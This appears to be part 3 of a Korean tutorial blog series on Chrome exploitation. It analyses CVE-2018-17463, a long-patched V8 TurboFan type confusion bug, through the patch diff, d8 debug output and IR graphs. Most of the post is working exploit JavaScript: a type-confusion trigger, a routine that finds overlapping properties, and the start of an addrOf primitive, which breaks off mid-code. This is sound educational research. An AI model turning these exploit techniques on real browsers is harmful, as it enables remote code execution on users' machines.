---
title: "[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 3.(KR)"
author: OUYA77
tags: [Type Confusion 101, CVE-2018-17463, Chrome, Chromium, OUYA77, RCE, Type Confusion, pwnable]
categories: [Research]
date: 2025-09-26 17:00:00
cc: true
index_img: /2025/09/26/OUYA77/Chrome_part3/kr/TypeConfusion101_Part3.jpg
---

안녕하세요, OUYA77입니다. 2025년도가 어느덧 4분기에 접어드려고 하고 있네요. 환절기 감기 조심하시고 남은 올해도 후회없이 보내시는 여러분 되길 응원합니다 b 

Part 1. 에서는 크롬의 전체 아키텍처를 살펴보았고, Part 2. 에서는 Type Confusion이라는 취약점이 V8 엔진에서 어떻게 발생하고, 이것이 왜 Relative R/W로 이어지는지 다루었습니다.

> 안보셨다면 
→ [[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆ Part 1.](https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/) 
→ [[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆ Part 2.](https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/)
> 

이번엔 글 좀만 쓰고 찐한 포너블의 향기를 느끼기 위해 지난 시간의 내용은 Relative R/W만 Recap 하고 실제 exploit에서의 payload를 같이 살펴보도록 하죠! 갈 길이 머니 바삐 가봅시다 :)

## 0. Relative R/W Recap

![image.png](image.png)

V8은 성능 최적화를 위해 객체의 구조가 변하지 않을 것이라는 가정 아래 Hidden Class(Maps)와 ElementsKind 같은 내부 메커니즘을 사용합니다. 이 정보들을 바탕으로 V8의 JIT 컴파일러인 TurboFan은 고성능의 네이티브 코드를 생성합니다. 하지만 자바스크립트는 매우 동적인 언어여서, **런타임에 객체 구조나 배열 타입이 변경되면 이 가정이 깨질 수 있습니다**. 이때 V8이 적절히 기존의 최적화된 코드를 deoptimize 하지 못하면, 잘못된 타입 정보를 기반으로 메모리에 접근하게 되면서 위 그림과 같이 Relative R/W가 가능해집니다.

이번 파트에서 과거 크롬 버전을 이용하여 Type Confusion 으로 Relative Address R/W primitive를 얻고 Arbitary Address R/W로 다듬어 Code Execution으로 가는 여정을 같이 떠나보시죠! 이번 포스트에서는 Heap Sandbox 이전 era에서의 취약점에 대해 다루도록 하겠습니다.

## 1. Environments Set-up

Set-up은 잘 정리된 글이 있어서 본 포스트에서 길게 다루지 않고, 제가 해보면서 중요했었던 부분만 첨언해보겠습니다.

> Set-up 링크→ [https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159](https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159)
> 

Windows SDK 버전들을 잘 맞춰주셔야 하고 depot_tools에 python3.bat이 있는게 이게 cmd창에서 where python 했을 때, depot_tools에 있는 python3.bat이 나와야해서 python.bat으로 symbolic link를 걸어주시고 환경변수 PATH에서도 depot_tools의 위치를 최상단으로 놓아주세요. 빌드할 때 필요합니다!

마지막으로 SDK `10.0.26100.0` 이 버전으로 빌드되니 visual studio installer 에서 버전 정보 잘 확인해서 다운받아주세요(`tools\dev\gm.py x64.debug` 에 버전이 하드코딩되어있어서 웬만하면 버전 맞춰서 빌드해주는게 좋습니다).

```jsx
c:\dev\source\v8>python3 tools\dev\gm.py x64.debug
# gn gen out\x64.debug
Done. Made 740 targets from 225 files in 6288ms
# autoninja -C out\x64.debug d8
offline mode
ninja: Entering directory `out\x64.debug'
exec_root=C:\dev\source\v8 dir=out\x64.debug
build finished
local:2609 remote:0 cache:0 cache-write:0(err:0) fallback:0 retry:0 skip:312
fs: ops: 41931(err:5273) / r:12710(err:0) 20.66GiB / w:122(err:0) 100.98MiB
 resource/capa used(err)  wait-avg |   s m |  serv-avg |   s m |
  localexec/32   2527(0)  4m03.72s |▂ ▂▂▇█▃|    10.08s | ▂▄▇█▂ |
14m13.39s Build Succeeded: 2609 steps - 3.06/s
Done! - V8 compilation finished successfully.
```

위와 같이 기분좋은 `Done!`이 나오면 성공적으로 설치를 완료한 것입니다! 🙌

자바스크립트 엔진인 **V8**은 우리가 작성한 코드를 바로 기계어로 번역하지 않습니다. 대신, **바이트코드**라는 중간 언어로 먼저 변환합니다. 이 바이트코드는 **Ignition 인터프리터**가 실행하며, 반복적으로 사용되는 부분은 **TurboFan 컴파일러**가 최적화하여 더 빠른 기계어로 만듭니다.

아래는 `Array.from(String('12345'))`라는 간단한 자바스크립트 코드를 `d8` 쉘에서 실행했을 때 생성된 바이트코드의 핵심 부분입니다.

![image.png](image%201.png)

`Array.from(String('12345'))`

이 코드는 크게 두 단계로 나뉩니다.

1. `String('12345')`를 실행하여 문자열 객체를 생성합니다.
2. `Array.from()`을 실행하여 문자열 객체를 배열로 변환합니다.

이 두 단계는 V8 엔진 내부에서 **바이트코드**라는 중간 언어로 표현됩니다. 바이트코드와 어셈블리어는 둘 다 코드를 나타내는 저수준 언어이지만, 큰 차이점이 있습니다. 어셈블리어는 CPU와 같은 특정 하드웨어에 직접 명령을 내리는 기계어의 인간 친화적인 형태입니다. 따라서 CPU 아키텍처에 종속적이며, 코드를 실행하려면 특정 CPU에 맞게 컴파일해야 합니다.

반면, 바이트코드는 특정 하드웨어에 종속되지 않는 추상적인 명령어입니다. 바이트코드는 마치 가상의 CPU(Virtual Machine)처럼 동작하는 인터프리터(Ignition) 위에서 실행됩니다. 덕분에 자바스크립트 코드는 별도의 컴파일 과정 없이 다양한 운영체제와 CPU에서 즉시 실행될 수 있습니다.

여기서 사용된 **D8은 V8 엔진의 개발 및 디버깅용 쉘**입니다. D8을 사용하면 웹 브라우저 없이도 V8 엔진을 직접 실행하고,  `--print-bytecode`와 같은 디버깅 옵션을 통해 엔진의 내부 동작을 자세히 들여다볼 수 있습니다. 따라서 V8의 바이트코드가 어떻게 생성되고 실행되는지 분석하는 데 매우 유용한 도구입니다. 이번 파트에서는 익스플로잇 과정을 따라 가기 위해 이 D8을 잘 이용해서 스텝바이스텝으로 가봅시다!

분석글은 [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/) 를 참고했습니다.

이제 실제 V8에서 취약점을 trigger 하기 위해 git version을 돌려봅시다.

```c
C:\dev\source\v8>git checkout 568979f4d891bafec875fab20f608ff9392f4f29
Updating files: 100% (15550/15550), done.
Previous HEAD position was b801900344f [gtest] Clean up single-arg `testing::Invoke()`s
HEAD is now at 568979f4d89 [parser] Fix memory accounting of explicitly cleared zones
```

해당 버전을 빌드하기 위해선 다음을 추가로 설치해줘야하는데요. 

- MSVC v140 - VS 2015 C++ build tools (v14.00)
- MSVC v141 - VS 2017 C++ x64/x86 build tools (v14.16)
- Windows 10 SDK (10.0.17134.0)
    - 비슷한 버전이라면 폴더를 복사해서 이 버전으로 맞춰주셔도 좋습니다. 저는 `10.0.19041.0` 이걸 깔고 폴더명을 `10.0.17134.0` 로 바꿨어요.

```c
C:\dev\source\v8>gn gen --ide=vs out\x64.debug
ERROR at //.gn:24:48: No value named "exec_script_whitelist" in scope "build_dotfile_settings"
exec_script_whitelist = build_dotfile_settings.exec_script_whitelist + []
```

바로 되지는 않습니다! 왜냐면 옛날 버전이기 때문에 옛날 버전의 빌드 도구로 같이 sync를 맞춰줘야 하기 때문이죠. ~~(2018년도 어느덧,,, 7년전이 되었네요 TMI지만 제가 18년도에 20살이었습니다 ㅎ.ㅎ)~~

`gclient sync` 명령어를 통해서 빌드 툴체인도 sync를 맞춰줘야하는데 python2로 빌드해야하니 `where python` 했을 때 python2 가 제일 위에 나오게 해주셔야 합니다.

그리고 환경변수도 다음과 같이 맞춰주세요.

`set GYP_MSVS_OVERRIDE_PATH=C:\Program Files (x86)\Microsoft Visual Studio 14.0`

그 후 빌드를 하면 잘 됨을 확인할 수 있습니다.

```c
c:\dev\source\v8>gclient sync
...
Running hooks: 100% (30/30), done
```

다시 돌아와서 크롬 빌드를 해보겠습니다.

```c
c:\dev\source\v8>gn gen --ide=vs out\x64.debug
Generating Visual Studio projects took 96ms
Done. Made 129 targets from 74 files in 1597ms
```

> 저는 여기서 ninja 빌드가 안되었는데 되신다면 아래 내용을 윈도우에서 진행하시면 되고 안되신다면 리눅스에서 하시면 되겠습니담 Part 4에서는 2023년도 1day를 다루려고 하는데 거기서는 윈도우에서 실습할게요!
> 

# 2. CVE-2018-17463

CVE-2018-17463은 `Google Chrome Versions 69.0 and before` 에서 Type Confusion으로 Renderer에서 RCE가 가능한 취약점입니다. 어떻게 이게 가능했는지 Root cause 부터 분석해봅시다.

## 2.1 **Root Cause**

JIT compiler인 Turbofan은 중복된 IR 을 탐지하고 제거하여 최적화를 수행합니다. 그러나 잘못된 방식으로 동작하면 `type check`과 같은 안전 검사를 제거할 수 있고 이 부분에서 Type Confusion이 발생할 수 있습니다.

### **Patch Diffing**

[Issue 888923](https://bugs.chromium.org/p/chromium/issues/detail?id=888923) 를 보면 `52a9e67a477bdb67ca893c25c145ef5191976220` 라는 [커밋](https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220)에 

> [turbofan] Fix ObjectCreate's side effect annotation.
> 

으로 올라와있습니다. 이 부분을 확인해보면

```c
C:\dev\source\v8>git show 52a9e67a477bdb67ca893c25c145ef5191976220
commit 52a9e67a477bdb67ca893c25c145ef5191976220
Author: Jaroslav Sevcik <jarin@chromium.org>
Date:   Wed Sep 26 13:23:47 2018 +0200

    [turbofan] Fix ObjectCreate's side effect annotation.

    Bug: chromium:888923
    Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79
    Reviewed-on: https://chromium-review.googlesource.com/1245763
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org>
    Commit-Queue: Jaroslav Sevcik <jarin@chromium.org>
    Cr-Commit-Position: refs/heads/master@{#56236}

diff --git a/src/compiler/js-operator.cc b/src/compiler/js-operator.cc
index 94b018c987d..5ed3f74e075 100644
--- a/src/compiler/js-operator.cc
+++ b/src/compiler/js-operator.cc
@@ -622,7 +622,7 @@ CompareOperationHint CompareOperationHintOf(const Operator* op) {
   V(CreateKeyValueArray, Operator::kEliminatable, 2, 1)                \
   V(CreatePromise, Operator::kEliminatable, 0, 1)                      \
   V(CreateTypedArray, Operator::kNoProperties, 5, 1)                   \
-  V(CreateObject, Operator::kNoWrite, 1, 1)                            \
+  V(CreateObject, Operator::kNoProperties, 1, 1)                       \
   V(ObjectIsArray, Operator::kNoProperties, 1, 1)                      \
   V(HasProperty, Operator::kNoProperties, 2, 1)                        \
   V(HasInPrototypeChain, Operator::kNoProperties, 2, 1)                \
diff --git a/test/mjsunit/compiler/regress-888923.js b/test/mjsunit/compiler/regress-888923.js
new file mode 100644
...
```

`CreateObject` 라는 Javascript 의 Opreation에서  `Operator::kNoWrite` 플래그가 `Operator::kNoProperties` 로 변경되었음을 확인할 수 있습니다. NoWrite는 “객체의 상태가 변경되지 않겠다.”는 의미로 메모리 상에서 추가적인 갱신이 없겠다는 의미인데, 이 과정에서 Properties의 layout인 Map이 바뀌는 side effect가 있어서 Map이 바뀌지 않도록 “이 객체는 속성이 변하지 않아.”로 Fix되었습니다.

### Code Review

자바스크립트에서 `Object.create(proto)`를 호출하면 새 객체를 만들고, 그 객체의 `[[Prototype]]`을 `proto`로 직접 설정합니다.

즉,

```jsx
let animal = { type: "animal" };
let dog = Object.create(animal);
console.log(dog.type); // "animal"

```

여기서 `dog` 객체는 자체적으로 `type` 속성을 가지고 있지 않지만, `[[Prototype]]`이 `animal`을 가리키기 때문에 `dog.type`을 찾을 수 있습니다. 따라서 `Object.create`는 새로운 prototype chain을 시작하는 “접착제 역할”을 합니다.

> 자바스크립트 객체와 prototype chain
> 
> - 자바스크립트에서 모든 객체는 내부적으로 `[[Prototype]]`이라는 숨은 링크를 가집니다.
> - 이 링크는 또 다른 객체(프로토타입)를 가리키고, 그 객체도 또 다른 프로토타입을 가리킬 수 있습니다.
> - 이렇게 이어지는 구조가 **prototype chain**입니다.
> - JS에서 속성이나 메서드를 찾을 때:
>     1. 자기 자신에게서 찾고
>     2. 없으면 `[[Prototype]]`을 따라 올라가고
>     3. 최종적으로 `null`을 만날 때까지 반복합니다.

![image.png](image%202.png)

`ObjectCreate` 함수가 새로운 map을 만드는 과정을 따라가보겠습니다. `ObjectCreate`라는 함수는 `prototype` 을 인자로 받고, `GetObjectCreateMap` 함수를 호출합니다. 

![image.png](image%203.png)

`GetObjectCreateMap` 역할은 **주어진 prototype에 맞는 객체 생성 맵(Object Create Map)을 반환**하는 것입니다. 여기서 side effect 가 발생할 수 있습니다. 

1. `JSObject::OptimizeAsPrototype`: 전달된 객체를 “프로토타입으로 쓰기 최적화된 상태”로 바꿉니다. 즉, 일반 객체를 프로토타입 객체로 전환합니다.
2. `Map::TransitionToPrototype`: 맵을 새로운 프로토타입에 맞도록 전환합니다. 즉, 기존 맵과의 연결 관계가 바뀝니다.

이 부분이 중요한 이유는, 이 코드가 “새로 생성된 객체가 프로토타입 객체로 변환되며, 동시에 그 객체와 연결된 맵(map) 또한 변경된다”는 부분입니다. 따라서 단순히 `Object.create(proto)`를 호출하는 것만으로도 **객체가 프로토타입 객체로 바뀌고, 그와 연결된 맵 구조도 달라질 수 있습니다**.

### Practice

이제 이 내용을 `d8`에서 확인해보겠습니다.

```c
C:\dev\source\v8>out\x64.debug\d8 --allow-natives-syntax
V8 version 14.2.0 (candidate)
d8> let obj = {x:13};
undefined
d8> %DebugPrint(obj)
DebugPrint: 0x21700389515: [JS_OBJECT_TYPE]
 - map: 0x02170006c2fd <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0217000545fd <Object map = 0000021700053979>
 - elements: 0x0217000007bd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x0217000007bd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x21700003601: [String] in ReadOnlySpace: #x: 13 (const data field 0, attrs: [WEC]) @ Any, location: in-object
 }
0x2170006c2fd: [Map] in OldSpace
 - map: 0x021700053419 <MetaMap (0x021700053469 <NativeContext[300]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 16  
 - inobject properties: 1
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x02170006c2d5 <Map[16](HOLEY_ELEMENTS)>
 - prototype_validity_cell: 0x021700000ac9 <Cell value= [cleared]>
 - instance descriptors (own) #1: 0x021700389525 <DescriptorArray[1]>
 - prototype: 0x0217000545fd <Object map = 0000021700053979>
 - constructor: 0x021700053e91 <JSFunction Object (sfi = 0000021700351A15)>
 - dependent code: 0x0217000007cd <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

{x: 13}
```

위와 같이 객체가 하나 생성되었습니다. 이제 `Object.Create` 함수를 호출해봅시다.

```c
d8> Object.create(obj)
{}
d8> %DebugPrint(obj)
DebugPrint: 0x21700389515: [JS_OBJECT_TYPE]
 - map: 0x02170006d05d <Map[16](HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x0217000545fd <Object map = 0000021700053979>
 - elements: 0x0217000007bd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x02170038b3dd <NameDictionary[18]>
 - All own properties (excluding elements): {
   x: 13 (data, dict_index: 1, attrs: [WEC])
 }
0x2170006d05d: [Map] in OldSpace
 - map: 0x021700053419 <MetaMap (0x021700053469 <NativeContext[300]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 16
 - inobject properties: 1
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - dictionary_map
 - may_have_interesting_properties
 - prototype_map
 - prototype info: 0x02170006d085 <PrototypeInfo>
 - prototype_validity_cell: 0x021700000ac9 <Cell value= [cleared]>
 - instance descriptors (own) #0: 0x0217000007e5 <DescriptorArray[0]>
 - prototype: 0x0217000545fd <Object map = 0000021700053979>
 - constructor: 0x021700053e91 <JSFunction Object (sfi = 0000021700351A15)>
 - dependent code: 0x0217000007cd <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

{x: 13}
```

함수 호출 후 map이 `FastProperties` 에서 `DictionaryProperties` 로 변경되었음을 확인할 수 있습니다. 이는 NoWrite 라는 플래그의 가정이 유효하지 않다는 것을 의미하는데요. 그래서 함수를 호출하기 전과 후로 map을 검사하는 operation이 없다면 Type Confusion을 발생시킬 수 있습니다.

## 2.2 Proof of Concept

### Type Confusion PoC

```c
function vuln(obj) {
    // Access Property a of obj, forcing a CheckMap operation
    obj.a;

    // Force a Map Transition via our side-effect
    Object.create(obj)

    // Trigger our type-confusion by accessing an out-of-bound property
    return obj.b;
}

vuln({a:42, b:43}); // Warm-up code
vuln({a:42, b:43});
%OptimizeFunctionOnNextCall(vuln); // JIT Compile vuln
vuln({a:42, b:43}); // Trigger type-confusion - should not return 43!
```

`Object.Create` 를 이용한 Type Confusion Trigger 를 해보겠습니다. d8에서 `--allow-naitives-syntax` 플래그를 주고 아래와 같이 입력하면, 

```
d8> vuln({a:42, b:43})
43
d8> vuln({a:42, b:43})
43
d8> %OptimizeFunctionOnNextCall(vuln)
undefined
d8> vuln({a:42, b:43})
0
```

최적화된 코드(컴파일된 코드)에서는 return 값이 다름을 확인할 수 있습니다. 

이를 IR 그래프로 보면,

```c
C:\dev\v8\v8\out\x64.debug>d8 --allow-natives-syntax --trace-turbo poc.js
Concurrent recompilation has been disabled for tracing.
---------------------------------------------------
Begin compiling method vuln using Turbofan
---------------------------------------------------
Finished compiling method vuln using Turbofan
```

![image.png](image%204.png)

Redundancy Elination으로 인해서 왼쪽에 있는 46번 `CheckMaps` 가 제거됨을 확인할 수 있습니다. 이때 28번 `JSCreateObject` 를 지날 때 Map transition이 발생해 Type Confusion이 발생할 수 있는겁니다.

### Five Steps to generate a Proof of Concept

위와 같이 Type Confusion 을 일으킨 후, 객체를 접근할 때의 side effect로 exploit을 하는건데요. 접근하는 단계는 다음과 같이 5개의 단계로 나눌 수 있습니다.

1. 프로토타입 객체 생성: 새로운 객체를 inline-property로 만듭니다. 이 객체는 `Object.create`의 프로토타입으로 사용할 예정입니다.
2. out-of-line property 추가: 객체의 property backing store에 out-of-line property를 추가합니다. 이 property는 Map transition 이후 접근할 것입니다.
3. `CheckMap` 연산 강제 실행: `CheckMap` 연산을 실행하여 중복 제거(redundancy elimination)를 유도합니다. 이 과정을 통해 이후에 나타나는 모든 `CheckMap` 연산이 제거됩니다. 
4. Map transition 유도: 이전에 만든 객체를 이용해 `Object.create`를 호출합니다. 이로 인해 객체의 구조가 바뀌고, 새로운 히든 클래스(Map)로 전환(transition)됩니다.
5. out-of-line property 접근: 마지막으로, out-of-line property에 접근합니다.

> **인라인 프로퍼티 (In-object Properties)**
인라인 프로퍼티는 객체 자체의 메모리 공간에 직접 저장되는 속성입니다. 이는 속성에 접근할 때 추가적인 메모리 참조가 필요 없어 가장 빠르고 효율적인 방식입니다. V8은 객체의 Map(Hidden Class)을 통해 각 인라인 프로퍼티의 정확한 오프셋을 파악합니다.
> 
> 
> **아웃오브라인 프로퍼티 (Out-of-line Properties)**
> 객체에 속성이 많아 인라인 프로퍼티 공간이 부족해지면, 나머지 속성들은 아웃오브라인 프로퍼티로 분류되어 별도의 저장소인 property backing store에 저장됩니다. 이 방식은 인라인 방식보다 **한 단계의 간접 접근이 더 필요**합니다.
> 
> **Speculation Guard**
> `CheckMap`은 객체의 히든 클래스가 예상한 것과 일치하는지 확인하는 연산으로, Speculation Guard의 일종입니다. JIT 컴파일러는 코드 실행 패턴을 분석하여 특정 변수의 타입이 항상 같을 것이라고 추측하고, 이 가정을 기반으로 최적화된 코드를 생성합니다. `CheckMap`은 이러한 추측이 여전히 유효한지 확인하는 역할을 합니다.
> 

말로만 보면 잘 이해가 안되니 다음 절에서 코드를 통해서 살펴보도록 하겠습니다.

## 2.3 **Exploiting a Type Confusion**

### Map Transition

2.2절에서는 `%OptimizeFunctionOnNextCall`를 썼는데, 이는 개발자가 명시적으로 최적화 시점을 제어하는 방법이어서, 반복문을 통해 V8이 스스로 최적화 필요성을 판단하도록 유도하도록 해보겠습니다. 그동안 같이 알아봤던 것처럼 일반적인 JavaScript 코드는 V8 엔진의 최적화 파이프라인을 거칩니다. V8은 이 과정에서 특정 함수가 "자주 실행되는(hot)" 경로라고 판단하면, JIT 컴파일러(Maglev, TurboFan)를 사용하여 해당 함수를 고성능의 네이티브 코드로 최적화합니다.

```c
function vuln(obj) {
  // Access Property a of obj, forcing a CheckMap operation
  obj.a;

  // Force a Map Transition via our side-effect
  Object.create(obj)

  // Trigger our type-confusion by accessing an out-of-bound property
  return obj.b;
}

for (let i = 0; i < 10000; i++) {
  let obj = {a:42}; // Create object with in-line properties
  obj.b = 43; // Store property out-of-line in backing store
  if (i = 1) { %DebugPrint(obj); }
  vuln(obj); // Trigger type-confusion
  if (i = 9999) { %DebugPrint(obj); }
}
```

위 코드를 json 파일로 저장한 후 d8에서 확인해보면 아래와 같은 결과를 얻을 수 있습니다.

![image.png](image%205.png)

- 객체의 layout을 담고 있는 Map이 `FastProperties`에서 `DictionaryProperties`로 변경되었습니다.
- (사진 아래부분이 좀 잘리긴 했지만..) property backing store가 `FixedArray`에서 `NameDictionary`로 전환되었음을 확인할 수 있습니다.

> V8 엔진은 객체의 속성(property)이 너무 많아 인라인 프로퍼티 공간을 초과할 때, 나머지 속성들을 별도의 메모리 공간에 저장합니다. 이 저장소를 property backing store라고 부르는데, 이것이 바로 **FixedArray**로 구현된 **PropertyArray**입니다. 따라서 **PropertyArray**는 객체의 아웃오브라인 프로퍼티를 담는 데 사용되는 특수한 목적의 **FixedArray**라고 볼 수 있습니다.
> 

`FixedArray`와 `NameDictionary` 는 각각 다음과 같이 구성되어있습니다.

![image.png](image%206.png)

FixedArray (PropertyArray)는 연속적인 값 슬롯을 갖는 단순 배열 구조. 주로 객체의 out-of-line(인라인 공간을 초과한) 프로퍼티 값들을 **순서대로** 저장합니다. 레이아웃을 단순하게 나타내면 다음과 같습니다.

```
FixedArray:
[ header | slot0 | slot1 | slot2 | slot3 | ... ]
```

NameDictionary는 해시테이블/딕셔너리 형태로 (key, value, details) 튜플을 저장합니다. 속성 이름과 값, 그리고 속성의 속성값(details)을 함께 유지해야 하므로 구조가 복잡합니다. 프로세스-단위 해시 시드(randomness)가 섞이므로, 키들이 테이블에 배치되는 위치는 실행마다 바뀔 수 있습니다. 간단하게 말해서 
NameDictionary는 복잡한 구조를 가진 해시 테이블이며, 속성의 저장 위치가 실행마다 무작위로 변동되어 예측하기 어렵습니다. 이또한 레이아웃을 간단히 나타내보겠습니다.

```
NameDictionary:
[ header | ... | key0 | value0 | details0 | key1 | value1 | details1 |...]
```

이처럼 서로 다른 type의 property가 confusion 되면 어떤 side-effect가 발생할 수 있을까요?

`FixedArray`에 저장될 때 순서대로(`0`, `1`, `2`...) 위치했던 속성들이 `NameDictionary`로 전환되면, 완전히 다른 메모리 오프셋에 불규칙하게 흩어지게 됩니다. 이때, JIT 컴파일러는 `FixedArray`의 오프셋을 기준으로 코드를 실행하지만, 실제로는 `NameDictionary`의 구조에 접근하면서 **다른 위치에 있는 속성이 우연히 같은 오프셋에 겹쳐 보이게 되는 현상**이 발생합니다. 이제 이 현상을 trigger 함으로써 exploit을 할 수 있는 primitive를 얻을 수 있습니다.

위에서 보신 것처럼 반복문을 통한 hot code로 JIT 컴파일러가 객체의 map을 가정하도록 합니다. 이러면 고정된 오프셋으로 property에 접근하는 native 코드가 생성됩니다. 예를 들면, `obj.p10`은 `base + offset + 10*8`에서 읽도록 컴파일된다. 이렇게 오프셋이 고정된 채로 컴파일되었다면, 런타임에 Map transition을 발생시킵니다. 이러면 객체의 map이 `FastProperties` → `DictionaryProperties`로 전환되어요. 즉 backing store가 `FixedArray`에서 `NameDictionary`로 교체됩니다. 하지만, **JIT 코드는 바뀐 구조를 모르고 계속 고정된 오프셋으로 접근합니다.** JIT 코드가 여전히 `FixedArray`의 오프셋으로 읽는데, 실제 메모리는 이제 `NameDictionary` 레이아웃임으로, 두 레이아웃의 필드 배치가 다르기 때문에 **같은 접근이 다른 필드를 읽게 됩니다.**

### Finding Overlapping Properties

```c
// Create object with one inline and 31 out-of-line properties
function makeObj() {
    let obj = {inline: 1234};
    for (let i = 1; i < 32; i++) {
        Object.defineProperty(obj, 'p' + i, {
            writable: true,
            value: -i
        });
    }
    return obj;
}
```

우선 객체는 인라인 프로퍼티 하나(`inline`)와 아웃오브라인 프로퍼티 31개(`p1` ~ `p31`)를 생성합니다. 각 아웃오브라인 프로퍼티엔 딕셔너리 내부에 존재하는 길이 같은 작은 양수 값과 혼동되지 않도록 음수 값을 심어두어, 나중에 덤프 결과에서 우리가 심은 값만 확실히 식별할 수 있게 합니다. 여기서 `obj.inline` 같은 하나의 인라인 접근을 넣은 까닭은 JIT가 `CheckMap`을 거쳐 “이 객체는 이 map을 가진다”라는 가정을 만들거나 확인하게 됩니다. 즉 이 `obj.inline` 접근이 **vuln()에서 맵 체크**를 발생시키는 역할을 합니다. 이후 map transition을 일으키면 JIT가 이전 가정을 계속 사용해서 Type Confusion이 발생합니다.

겹치는 속성 쌍을 찾는 전체 poc 코드를 살펴보겠습니다.

```c
// Create object with one inline and 31 out-of-line properties
function makeObj() {
    let obj = {inline: 1234};
    for (let i = 1; i < 32; i++) {
        Object.defineProperty(obj, 'p' + i, {
            writable: true,
            value: -i
        });
    }
    return obj;
}

// Find a pair of properties where p1 is stored at the same offset
// in the FixedArray as p2 is in the NameDictionary
function findOverlappingProperties() {
    // Create an array of all 32 property names such as p1..p32
    let pNames = [];
    for (let i = 0; i < 32; i++) {
        pNames[i] = 'p' + i;
    }

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      // Access Property inline of obj, forcing a CheckMap operation
      obj.inline;
      // Force a Map Transition via our side-effect
      this.Object.create(obj);
      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
  `)

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj());
        // Print FixedArray when i=1 and Dictionary when i=9999
        if (i == 1 || i == 9999) {
            print(res);
        }
    }
}

print("[+] Finding Overlapping Properties");
findOverlappingProperties();
```

취약점을 트리거하는 `vuln()` 함수는 `eval`과 템플릿 리터럴을 이용해 런타임에 `p1`~`p31`을 읽고 배열로 반환하는 코드를 동적으로 생성합니다. 이렇게 하면 사람이 일일이 코드를 적지 않아도 많은 속성을 한꺼번에 읽어들이는 JIT 코드를 만들 수 있고, 반복 실행을 통해 JIT 프로파일링이 일어나 최적화된(고정 오프셋을 쓰는) 코드를 유도할 수 있습니다.

탐색 전략은 다음과 같습니다. 먼저 많은 후보 property를을 심어 버그(Type Confusion) 트리거 전후의 읽기 결과를 비교해 차이가 나는 인덱스를 찾습니다. 

![image.png](image%207.png)

> 참고로 ../v8은 최신버전으로 해당 버그가 재현되지 않음을 확인할 수 있습니다.
> 

동일한 객체 형태를 수천 번 반복 실행해 JIT 컴파일을 유도한 뒤, 의도적으로 map 전환을 발생시켜 FixedArray 상태와 NameDictionary 상태의 읽기 결과를 비교하면 “음수 값이 이동한 위치”가 후보가 됩니다. 이 후보들 중에서 pX가 자기 자신과 겹치는 무의미한 케이스는 제거하고, 서로 다른 속성 쌍(pA ↔ pB)만 골라 동일한지 확인합니다. 아래 코드는 겹치는 속성 쌍을 찾는 전체 poc 코드입니다.

```c
// Function that creates an object with one in-line and 32 out-of-line properties
function makeObj() {
    let obj = {inline: 1234};
    for (let i = 1; i < 32; i++) {
        Object.defineProperty(obj, 'p' + i, {
            writable: true,
            value: -i
        });
    }
    return obj;
}

// Function that finds a pair of properties where p1 is stored at the same offset
// in the FixedArray as p2 in the NameDictionary
let p1, p2;

function findOverlappingProperties() {
    // Create an array of all 32 property names such as p1..p32
    let pNames = [];
    for (let i = 0; i < 32; i++) {
        pNames[i] = 'p' + i;
    }

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      // Access Property inline of obj, forcing a CheckMap operation
      obj.inline;
      // Force a Map Transition via our side-effect
      this.Object.create(obj);
      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
  `)

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        // Create Object and pass it to Vuln function
        let res = vuln(makeObj());
        // Look for overlapping properties in results
        for (let i = 1; i < res.length; i++) {
            // If i is not the same value, and res[i] is between -32 and 0, it overlaps
            if (i !== -res[i] && res[i] < 0 && res[i] > -32) {
                [p1, p2] = [i, -res[i]];
                return;
            }
        }
    }
    throw "[!] Failed to find overlapping properties";
}

print("[+] Finding Overlapping Properties...");
findOverlappingProperties();
print(`[+] Properties p${p1} and p${p2} overlap!`);
```

![image.png](image%208.png)

위에서 말씀드렸다시피 NameDictionary는 속성의 저장 위치가 실행마다 무작위로 변동되어 런타임에 이렇게 동적으로 쌍을 찾아줘야합니다. 이제 이 쌍을 이용해서 어떻게 Read/Write primitive를 얻을 수 있는지 알아봅시다!

### The addrOf Read Primitive

double 형태로 저장되는 inline 객체를 하나 만든 후 그 다음 backing store에 저장되는 객체를 하나 선언 후, Type Confusion을 일으켜봅시다. 그럼 객체 포인터가 `double` 타입으로 해석됩니다.

```jsx
function addrOf() {
    // 1. vuln 함수 동적 생성 (Map 검사 우회)
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      // p1을 Double로 예상하지만, 실제 p2인 Object 포인터가 로드됨
      return obj.p${p1}.x; 
    }
  `);

    let obj = {z: 1234}; // 주소를 알고자 하는 대상 객체
    let pValues = [];
